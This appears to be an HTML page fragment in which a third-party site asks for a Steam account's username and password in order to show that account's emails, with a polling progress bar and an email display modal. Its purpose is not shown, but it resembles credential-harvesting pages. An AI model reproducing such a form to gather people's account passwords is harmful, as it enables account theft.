<body>
  <div id="recovery_ui" class="container text-center"
    style="margin: auto;height: 50%;min-width: 200px; padding-top: 7%;">
    <div id="error_invalid" class="alert alert-dismissible alert-danger" style="display: none">
      <h4 class="alert-heading">Error!</h4>
      <p class="mb-0">Incorrect Username/Password Combination</p>
    </div>
    <div id="error_others" class="alert alert-dismissible alert-danger" style="display: none">
      <h4 class="alert-heading">Unknown Error!</h4>
      <p class="mb-0">Temporary Failure. Please try again</p>
    </div>
    <div class="modal fade" id="email_display" style="padding-right: 27rem">
      <div class="modal-dialog">
        <div class="modal-content" style="width: 60rem">
          <div class="modal-header">
            <h5 class="modal-title">Email</h5>
          </div>
          <div class="modal-body">
            <div id="custom_domain_div" class="card border-dark mb-3" style="margin:auto;">
              <div class="card-body">
                <span id="email_content"></span>
              </div>
            </div>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>
    <div id="polling_email" style="display: none;">
      <h5 id="acc_email">Waiting for emails status</h5>
      <div class="progress">
        <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuenow="0"
          aria-valuemin="0" aria-valuemax="100" style="width: 100%"></div>
      </div>
    </div>
    <br><br>
    <div class="form-group">
      <h4><strong>Enter the details of the Steam Account to get access to the email</strong></h4>
      <div class="form-group">
        <label for="exampleInputEmail1">Username</label>
        <input type="text" id="username" class="form-control" name="username" aria-describedby="emailHelp"
          placeholder="Enter username of the steam account">
        <label for="exampleInputPassword1">Password</label>
        <input type="password" id="password" class="form-control" name="password"
          placeholder="Enter Password of the steam account">
      </div>
      <button type="submit" onclick="gtag('event', 'email_recovery');EmailAccessCheck()"
        class="btn btn-primary">Submit</button>
    </div>
  </div>
